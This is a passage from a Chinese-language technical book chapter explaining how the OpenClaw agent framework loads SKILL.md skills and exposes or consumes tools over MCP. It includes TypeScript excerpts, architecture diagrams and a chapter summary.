      "install": [ { "id": "brew", "kind": "brew", "formula": "steipete/tap/summarize", ... } ] } }
---

# Summarize

Fast CLI to summarize URLs, local files, and YouTube links.
## When to use (trigger phrases)
...
```

`SKILL.md` 由两部分组成：

- **frontmatter**（YAML）：`name`、`description`，以及 `metadata.openclaw` 块里的 OpenClaw 专属元数据。
- **正文**（Markdown）：详细的操作指令。

技能的工作方式：系统 prompt 里只放每个技能的 `name + description`（一行摘要），模型自己判断"当前任务匹配哪个技能"，然后用 `read` 工具去读那个技能的 `SKILL.md` 全文。`formatSkillsForPrompt()`（`src/agents/skills/skill-contract.ts:46`）生成的提示文字明说了这一点：「Use the read tool to load a skill's file when the task matches its description.」

为什么这样设计？因为技能正文可能很长，全部塞进系统 prompt 会浪费大量 token。"先放摘要、按需读全文"是一种**渐进式上下文加载**——只有真要用的技能才付出 token 成本。`v2026.5.18` 自带约 50 个技能（`skills/` 下子目录），全部塞进 prompt 不现实。

### 9.11.2 技能元数据

`OpenClawSkillMetadata`（`src/agents/skills/types.ts:20`）定义了 `metadata.openclaw` 块的结构：

```ts
export type OpenClawSkillMetadata = {
  always?: boolean;
  skillKey?: string;
  primaryEnv?: string;
  emoji?: string;
  homepage?: string;
  os?: string[];
  requires?: { bins?: string[]; anyBins?: string[]; env?: string[]; config?: string[] };
  install?: SkillInstallSpec[];
};
```

- `requires`：技能的运行前提——需要哪些命令行二进制（`bins`）、环境变量、配置项。`summarize` 技能要求 `summarize` 这个二进制存在。
- `install`：`SkillInstallSpec[]`（`src/agents/skills/types.ts:3`），声明如何安装缺失的依赖——`kind` 可以是 `brew` / `node` / `go` / `uv` / `download`。`summarize` 的 install spec 说"用 brew 装 `steipete/tap/summarize`"。
- `always`：标记这个技能总是相关，应直接进上下文而非按需加载。

`requires` 与 `install` 配合，让 OpenClaw 能做"技能可用性检测"：检查 `bins` 是否在 PATH 里（`hasBinary`，`src/agents/skills/config.ts`），不在就提示用户用 `install` spec 安装。一个二进制不存在的技能不会被纳入系统 prompt——避免模型选了一个用不了的技能。

### 9.11.3 技能加载流程

技能加载的核心在 `src/agents/skills/workspace.ts`。技能来自三个来源：

<svg viewBox="0 0 760 420" xmlns="http://www.w3.org/2000/svg" class="figure-svg" role="img" aria-label="技能加载流程：bundled、workspace、plugin 三源合并进系统 prompt">
  <defs>
    <marker id="ar1" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto">
      <path d="M0,0 L10,5 L0,10 z" fill="#94a3b8"/>
    </marker>
  </defs>
  <rect x="180" y="10" width="260" height="70" rx="8" fill="#fed7aa" stroke="#ea580c" stroke-width="1.5"/>
  <text x="310" y="36" text-anchor="middle" font-size="13" font-weight="700" fill="#ea580c">bundled 技能</text>
  <text x="310" y="54" text-anchor="middle" font-size="11" fill="#64748b">(skills/ 目录)</text>
  <text x="310" y="70" text-anchor="middle" font-size="10" fill="#94a3b8">随 core 发布，resolveBundledSkillsDir()</text>
  <line x1="310" y1="80" x2="310" y2="120" stroke="#94a3b8" stroke-width="1.2" marker-end="url(#ar1)"/>
  <rect x="180" y="120" width="260" height="70" rx="8" fill="#ddd6fe" stroke="#7c3aed" stroke-width="1.5"/>
  <text x="310" y="146" text-anchor="middle" font-size="13" font-weight="700" fill="#7c3aed">workspace 技能</text>
  <text x="310" y="164" text-anchor="middle" font-size="11" fill="#64748b">(用户自己写的)</text>
  <text x="310" y="180" text-anchor="middle" font-size="10" fill="#94a3b8">用户工作区/配置目录下的 skills/  walkDirectorySync 扫描</text>
  <line x1="310" y1="190" x2="310" y2="230" stroke="#94a3b8" stroke-width="1.2" marker-end="url(#ar1)"/>
  <rect x="180" y="230" width="260" height="80" rx="8" fill="#99f6e4" stroke="#0d9488" stroke-width="1.5"/>
  <text x="310" y="256" text-anchor="middle" font-size="13" font-weight="700" fill="#0d9488">plugin 技能</text>
  <text x="310" y="274" text-anchor="middle" font-size="11" fill="#64748b">(插件携带的)</text>
  <text x="310" y="292" text-anchor="middle" font-size="10" fill="#94a3b8">resolvePluginSkillDirs()</text>
  <line x1="310" y1="310" x2="310" y2="340" stroke="#94a3b8" stroke-width="1.2" marker-end="url(#ar1)"/>
  <rect x="140" y="340" width="340" height="64" rx="8" fill="#f1f5f9" stroke="#94a3b8" stroke-width="1"/>
  <text x="310" y="362" text-anchor="middle" font-size="12" font-weight="600" fill="currentColor">合并 → 过滤（按 os / requires / agent filter）</text>
  <text x="310" y="380" text-anchor="middle" font-size="11" fill="#64748b">buildWorkspaceSkillSnapshot()</text>
  <text x="310" y="394" text-anchor="middle" font-size="10" fill="#94a3b8">→ formatSkillsForPrompt() → 进系统 prompt</text>
</svg>
<span class="figure-caption">图 R9.2 ｜ 技能三源加载流程：bundled → workspace → plugin，合并过滤后进系统 prompt</span>

<details>
<summary>ASCII 原版</summary>

```
   ┌──────────────────────┐
   │ bundled 技能          │  随 core 发布，resolveBundledSkillsDir()
   │ (skills/ 目录)        │
   └──────────┬───────────┘
              │
   ┌──────────▼───────────┐
   │ workspace 技能        │  用户工作区/配置目录下的 skills/
   │ (用户自己写的)        │  walkDirectorySync 扫描
   └──────────┬───────────┘
              │
   ┌──────────▼───────────┐     合并 → 过滤（按 os/requires/agent filter）
   │ plugin 技能           │  resolvePluginSkillDirs()  → buildWorkspaceSkillSnapshot()
   │ (插件携带的)          │     → formatSkillsForPrompt() → 进系统 prompt
   └──────────────────────┘
```

</details>

关键函数（都从 `src/agents/skills.ts` re-export）：

- `loadWorkspaceSkillEntries()`：从工作区目录读出所有技能条目。
- `buildWorkspaceSkillSnapshot()`：构造一个技能快照 `SkillSnapshot`。
- `filterWorkspaceSkillEntries()`：按可用性、`os`、agent 过滤器（`resolveEffectiveAgentSkillFilter`，`src/agents/skills/agent-filter.ts`）筛选。
- `buildWorkspaceSkillsPrompt()` / `resolveSkillsPromptForRun()`：生成最终进系统 prompt 的技能文本。
- `syncSkillsToWorkspace()`：把合并后的技能同步进目标工作区目录。

技能加载有一个值得注意的优化：`compactSkillPaths()`（`src/agents/skills/workspace.ts:71`）会把技能文件路径里的用户主目录前缀替换成 `~`。`src/agents/skills/workspace.ts:33`–`42` 的注释解释了原因——「Models understand `~` expansion, and the read tool resolves `~` to the home directory. Saves ~5–6 tokens per skill path × N skills ≈ 400–600 tokens total.」。这是又一处为省 token 而做的微优化。

### 9.11.4 技能的热重载

技能文件是用户可以随时编辑的，OpenClaw 用 `chokidar` 监视技能目录。`src/agents/skills/refresh.ts` 维护一组 `FSWatcher`（`watchers`，`src/agents/skills/refresh.ts:30`），技能文件变化时触发 debounced 刷新，并 `bumpSkillsSnapshotVersion()` 让缓存失效。`DEFAULT_SKILLS_WATCH_IGNORED`（`src/agents/skills/refresh.ts:36`）排除了 `.git`、`node_modules`、`.venv`、`__pycache__` 等噪声目录——技能目录里常常有 Python 项目，不过滤会被无关变更刷爆。

### 9.11.5 技能命令

技能还能暴露成**命令**。`SkillCommandSpec`（`src/agents/skills/types.ts:50`）描述一个技能命令，`SkillCommandDispatchSpec`（`src/agents/skills/types.ts:40`）里的 `dispatch` 字段可以把命令**确定性地派发到某个工具**：

```ts
export type SkillCommandDispatchSpec = {
  kind: "tool";
  toolName: string;            // 要调用的工具名
  argMode?: "raw";             // 把原始 args 字符串原样转发
};
```

这意味着技能不一定要靠模型"读文档然后自己决定调什么工具"——它也可以声明"我这个 `/foo` 命令就是直接调 `bar` 工具"，跳过模型推理。`SkillInvocationPolicy`（`src/agents/skills/types.ts:35`）的 `userInvocable` / `disableModelInvocation` 进一步控制技能是用户可触发、还是模型可触发。

## 9.12 MCP 集成

MCP（Model Context Protocol）是一套标准协议，让 AI 工具能跨进程互通。OpenClaw 在 `src/mcp/` 下既做 **MCP 客户端**也做 **MCP 服务端**。

### 9.12.1 OpenClaw 作为 MCP 服务端

OpenClaw 把自己的能力通过 MCP 暴露给外部 AI agent（典型场景：让一个跑 Claude Code 的 ACP 会话能用 OpenClaw 的工具）。`src/mcp/` 里有三个 standalone MCP server：

**1. openclaw-tools server**（`src/mcp/openclaw-tools-serve.ts`）——暴露选定的内置工具：

```ts
export function resolveOpenClawToolsForMcp(): AnyAgentTool[] {
  return [createCronTool()];
}
```

`v2026.5.18` 这个 server 只暴露 `cron` 工具。它通过 `connectToolsMcpServerToStdio()`（`src/mcp/tools-stdio-server.ts`）走 stdio 传输——`node --import tsx src/mcp/openclaw-tools-serve.ts` 即可启动。

**2. plugin-tools server**（`src/mcp/plugin-tools-serve.ts`）——暴露**插件注册的工具**，例如 `memory-lancedb` 插件的 `memory_recall` / `memory_store` / `memory_forget`。文件头注释（`src/mcp/plugin-tools-serve.ts:2`–`6`）说明它的目的就是让 ACP 会话里的 Claude Code 能用 OpenClaw 插件工具。

它的工具解析路径值得看（`src/mcp/plugin-tools-serve.ts:43`）：

```ts
function resolveTools(config: OpenClawConfig): AnyAgentTool[] {
  const pluginToolPolicy = resolvePluginToolPolicy(config);
  ensureStandalonePluginToolRegistryLoaded({ context: { config }, ...pluginToolPolicy });
  return resolvePluginTools({ context: { config }, ... });
}
```

`resolvePluginToolPolicy()`（`src/mcp/plugin-tools-serve.ts:26`）先解析出工具策略——把 profile 策略（`resolveToolProfilePolicy`）、`alsoAllow`、沙箱策略（`pickSandboxToolPolicy`）合并出 allowlist/denylist。也就是说：通过 MCP 暴露插件工具时，**同样要过 OpenClaw 的工具策略**——一个被用户 deny 掉的插件工具不会通过 MCP 漏出去。

**3. channel server**（`src/mcp/channel-server.ts` + `src/mcp/channel-tools.ts`）——把 OpenClaw 的 channel/会话能力暴露成 MCP 工具。`registerChannelMcpTools()`（`src/mcp/channel-tools.ts:23`）注册了 `conversations_list`、`conversation_get`、`messages_read` 等工具：

```ts
server.tool(
  "conversations_list",
  "List OpenClaw channel-backed conversations available through session routes.",
  { limit: z.number().int().min(1).max(500).optional(), search: z.string().optional(), ... },
  async (args) => {
    const conversations = await bridge.listConversations(args);
    return { ...summarizeStructuredResult("conversations", conversations.length, { conversations }),
             structuredContent: { conversations } };
  },
);
```

注意这里工具参数 schema 用的是 `zod`——`@modelcontextprotocol/sdk` 的原生约定。channel server 的能力还由 `getChannelMcpCapabilities()`（`src/mcp/channel-tools.ts:11`）按 `claudeChannelMode`（`off`/`on`/`auto`）开关，关闭时返回 `undefined`，整个能力不暴露。

channel server 背后是 `OpenClawChannelBridge`（`src/mcp/channel-bridge.ts`）——一个把 MCP 工具调用桥接到 OpenClaw 内部会话子系统的适配层。

### 9.12.2 OpenClaw 作为 MCP 客户端

反过来，OpenClaw 也能消费外部 MCP server 的工具——这就是 `tool-catalog.ts` 里那个 `bundle-mcp` 工具（出现在 `coding`/`messaging` profile 的 allow 列表里，`src/agents/tool-catalog.ts:325`）。`bundle-mcp` 把一个外部 MCP server 暴露的工具集"打包"成 OpenClaw agent 可见的工具。相关实现在 `src/plugins/bundle-mcp.ts` 与 `src/agents/pi-bundle-mcp-tools.ts`。

回到 9.3.1 的 `ToolExecutorRef`：`mcp` 变体（`src/tools/types.ts:20`）携带 `serverId` 与 `toolName`——当一个工具的 executor 是 `mcp` 时，运行时知道"这次调用要转发给某个 MCP server"。声明层的 executor 判别联合正是为了让 MCP 工具、插件工具、core 工具能在同一份 `ToolPlan` 里共存。

### 9.12.3 取消支持

`src/mcp/plugin-tools-handlers.ts` 处理通过 MCP 暴露的插件工具的实际调用。`plugin-tools-handlers.cancel.test.ts` 印证了它支持调用取消——MCP 客户端发来取消信号时，正在执行的插件工具会收到 `AbortSignal`，工具 `execute(toolCallId, params, signal)` 的第三个参数就是这个信号。长时间运行的工具（web 抓取、媒体生成）必须尊重它。

## 9.13 全章数据流总览

把声明层、运行时层、审批、技能、MCP 串成一张图：

<svg viewBox="0 0 760 600" xmlns="http://www.w3.org/2000/svg" class="figure-svg" role="img" aria-label="工具系统全章数据流：声明层到模型到运行时到审批到结果回灌">
  <defs>
    <marker id="ar1" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto">
      <path d="M0,0 L10,5 L0,10 z" fill="#94a3b8"/>
    </marker>
    <marker id="ar2" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto">
      <path d="M0,0 L10,5 L0,10 z" fill="#ea580c"/>
    </marker>
  </defs>
  <text x="60" y="28" font-size="10" fill="#94a3b8">声明层 src/tools/</text>
  <rect x="180" y="10" width="520" height="100" rx="6" fill="#fed7aa" stroke="#ea580c" stroke-width="1.5"/>
  <text x="440" y="34" text-anchor="middle" font-size="13" font-weight="700" fill="#ea580c">ToolDescriptor[]</text>
  <text x="440" y="54" text-anchor="middle" font-size="11" fill="#64748b">↓  buildToolPlan()</text>
  <text x="440" y="72" text-anchor="middle" font-size="11" fill="#64748b">ToolPlan { visible, hidden }</text>
  <text x="440" y="90" text-anchor="middle" font-size="11" fill="#64748b">↓  toToolProtocolDescriptor()</text>
  <text x="440" y="106" text-anchor="middle" font-size="10" fill="#94a3b8">ToolProtocolDescriptor[]  →  provider adapter</text>
  <line x1="440" y1="110" x2="440" y2="142" stroke="#94a3b8" stroke-width="1.2" marker-end="url(#ar1)"/>
  <text x="480" y="132" font-size="10" fill="#64748b">name / description / inputSchema</text>
  <rect x="60" y="142" width="640" height="56" rx="6" fill="#ddd6fe" stroke="#7c3aed" stroke-width="1.5"/>
  <text x="380" y="163" text-anchor="middle" font-size="13" font-weight="700" fill="#7c3aed">模型</text>
  <text x="380" y="185" text-anchor="middle" font-size="11" fill="#64748b">收到工具 schema  →  生成 tool_call { name, args }</text>
  <line x1="380" y1="198" x2="380" y2="228" stroke="#94a3b8" stroke-width="1.2" marker-end="url(#ar1)"/>
  <text x="430" y="218" font-size="10" fill="#64748b">name 匹配</text>
  <text x="60" y="248" font-size="10" fill="#94a3b8">运行时层 src/agents/tools/</text>
  <rect x="180" y="228" width="400" height="44" rx="6" fill="#99f6e4" stroke="#0d9488" stroke-width="1.5"/>
  <text x="380" y="248" text-anchor="middle" font-size="12" font-weight="700" fill="#0d9488">AnyAgentTool 表</text>
  <text x="380" y="264" text-anchor="middle" font-size="10" fill="#64748b">createOpenClawTools() + 插件工具</text>
  <line x1="380" y1="272" x2="380" y2="302" stroke="#94a3b8" stroke-width="1.2" marker-end="url(#ar1)"/>
  <text x="430" y="292" font-size="10" fill="#64748b">before_tool_call 钩子</text>
  <line x1="280" y1="310" x2="200" y2="340" stroke="#94a3b8" stroke-width="1.2" marker-end="url(#ar1)"/>
  <line x1="480" y1="310" x2="560" y2="340" stroke="#94a3b8" stroke-width="1.2" marker-end="url(#ar1)"/>
  <rect x="60" y="340" width="240" height="80" rx="6" fill="#fef2f2" stroke="#f87171" stroke-width="1.2"/>
  <text x="180" y="364" text-anchor="middle" font-size="12" font-weight="600" fill="#dc2626">block / requireApproval</text>
  <text x="180" y="382" text-anchor="middle" font-size="11" fill="#64748b">审批门控（exec 等）</text>
  <text x="180" y="398" text-anchor="middle" font-size="10" fill="#94a3b8">两阶段 / 让出 turn</text>
  <rect x="460" y="340" width="240" height="80" rx="6" fill="#f0fdf4" stroke="#86efac" stroke-width="1.2"/>
  <text x="580" y="364" text-anchor="middle" font-size="12" font-weight="600" fill="#16a34a">放行</text>
  <text x="580" y="382" text-anchor="middle" font-size="11" fill="#64748b">execute(id, args, signal)</text>
  <line x1="300" y1="380" x2="460" y2="430" stroke="#94a3b8" stroke-width="1.2" stroke-dasharray="4,3" marker-end="url(#ar1)"/>
  <line x1="580" y1="420" x2="500" y2="450" stroke="#94a3b8" stroke-width="1.2" marker-end="url(#ar1)"/>
  <rect x="280" y="450" width="290" height="56" rx="6" fill="#f1f5f9" stroke="#cbd5e1" stroke-width="1.2"/>
  <text x="425" y="472" text-anchor="middle" font-size="12" font-weight="700" fill="currentColor">AgentToolResult</text>
  <text x="425" y="490" text-anchor="middle" font-size="10" fill="#64748b">图片清洗 / 结果守卫 / after_tool_call</text>
  <line x1="425" y1="506" x2="425" y2="534" stroke="#94a3b8" stroke-width="1.2" marker-end="url(#ar1)"/>
  <rect x="280" y="534" width="290" height="40" rx="6" fill="#f1f5f9" stroke="#cbd5e1" stroke-width="1"/>
  <text x="425" y="559" text-anchor="middle" font-size="12" font-weight="600" fill="currentColor">回灌进 agent 上下文 → 下一轮</text>
  <rect x="10" y="302" width="740" height="8" rx="3" fill="none"/>
  <text x="20" y="516" font-size="10" fill="#64748b">技能：SKILL.md → buildWorkspaceSkillsPrompt() → 系统 prompt（仅摘要）→ 模型按需 read 全文</text>
  <text x="20" y="534" font-size="10" fill="#64748b">MCP：服务端 openclaw-tools / plugin-tools / channel server ｜ 客户端 bundle-mcp</text>
</svg>
<span class="figure-caption">图 R9.3 ｜ 工具系统全章数据流：声明层规划 → 模型调用 → 运行时执行（含审批分支）→ 结果回灌</span>

<details>
<summary>ASCII 原版</summary>

```
                          ┌───────────────────────────────────────────┐
  声明层 src/tools/        │  ToolDescriptor[]                          │
                          │      ↓ buildToolPlan()                     │
                          │  ToolPlan { visible, hidden }              │
                          │      ↓ toToolProtocolDescriptor()          │
                          │  ToolProtocolDescriptor[]  → provider adapter
                          └───────────────────────────────────────────┘
                                            │ name/description/inputSchema
                                            ▼
  ┌──────────────────────────── 模型 ───────────────────────────────┐
  │  收到工具 schema  →  生成 tool_call { name, args }                │
  └────────────────────────────┬─────────────────────────────────────┘
                               │ name 匹配
                               ▼
  运行时层 src/agents/tools/    AnyAgentTool 表（createOpenClawTools + 插件工具）
                               │
                               ▼ before_tool_call 钩子
                       ┌───────┴────────┐
                  block / requireApproval     放行
                       │                       │
              审批门控（exec 等）          execute(id, args, signal)
              两阶段 / 让出 turn               │
                       │                       ▼
                       └──────────────→  AgentToolResult
                                              │ 图片清洗 / 结果守卫 / after_tool_call
                                              ▼
                                       回灌进 agent 上下文 → 下一轮

  技能：SKILL.md frontmatter+正文 → buildWorkspaceSkillsPrompt() → 系统 prompt（仅摘要）
        → 模型按需 read 全文
  MCP：服务端 openclaw-tools / plugin-tools / channel server（暴露能力）
       客户端 bundle-mcp（消费外部 MCP 工具）
```

</details>

## 9.14 小结与延伸

本章的核心要点：

1. **两层工具模型**——声明层（`src/tools/`，纯 `ToolDescriptor`）与运行时层（`src/agents/tools/`，可执行 `AnyAgentTool`）分离，让 core 能在冷路径上不付出运行时加载成本。
2. **可用性表达式**让工具按 auth/config/env/plugin/context 动态出现或消失，`buildToolPlan` 保证确定性排序与名字唯一性——这两点直接服务于 prompt cache。
3. **工具解析**靠 name 索引完成；执行前穿过 `before_tool_call` 钩子层，钩子可 block / requireApproval / 放行，且 fail-closed。
4. **审批门控**用两阶段（请求 + 决策）解耦，避免 agent 进程阻塞等待人工确认。
5. **技能**是给模型读的渐进式指令文档，系统 prompt 只放摘要，模型按需 `read` 全文，省 token。
6. **MCP** 让 OpenClaw 既能把自己的工具暴露出去（三个 standalone server），也能消费外部 MCP 工具（`bundle-mcp`）；MCP 工具同样要过 OpenClaw 工具策略。

延伸阅读：第 10 章会讲插件系统——`web_search` 背后的 provider、`memory_recall` 等工具都来自插件，插件通过 `api.registerTool` / `api.registerWebSearchProvider` 注册进运行时。第 06 章讲 agent 运行循环——本章的"结果回灌进下一轮"是那个循环的一部分。
